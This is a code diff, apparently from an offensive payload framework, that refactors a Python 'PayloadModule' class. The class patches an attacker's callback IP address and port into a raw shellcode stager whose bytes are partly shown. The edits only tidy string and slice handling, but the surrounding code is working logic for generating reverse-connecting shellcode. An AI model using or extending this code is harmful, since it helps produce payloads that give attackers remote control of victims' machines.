@@ -38,19 +38,15 @@ class PayloadModule:
             "\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")
 
     def gen_shellcode(self):
-        # Take the passed in attributes and gen shellcode
-        ip_shellcode = ''
         n = 2
         ip_shellcode_stage = binascii.hexlify(socket.inet_aton(self.lhost))
         ip_shellcode_stage = [ip_shellcode_stage[i:i + n] for i in range(0, len(ip_shellcode_stage), n)]
-        for two_bytes in ip_shellcode_stage:
-            ip_shellcode += '\\x' + two_bytes
-
+        ip_shellcode = ''.join('\\x' + two_bytes for two_bytes in ip_shellcode_stage)
         # convert port to shellcode
-        port_shellcode_stage = str(hex(self.lport).lstrip('0'))
+        port_shellcode_stage = hex(self.lport).lstrip('0')
         if len(port_shellcode_stage.lstrip('x')) == 3:
             # detect if odd number, is so, need to add a '0' to the front
-            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
+            port_1half = '0' + port_shellcode_stage[:2].lstrip('x')
             port_1half = '\\x' + port_1half
             port_2half = port_shellcode_stage[2:4]
             port_2half = '\\x' + port_2half
@@ -75,7 +71,7 @@ class PayloadModule:
 
         retries = '\x09'
 
-        stager_shellcode = self.stager[0:self.retries_offset]
+        stager_shellcode = self.stager[:self.retries_offset]
         stager_shellcode += retries
         stager_shellcode += self.stager[self.retries_offset + 1:self.lhost_offset]
         stager_shellcode += ip_shellcode.decode('string-escape')
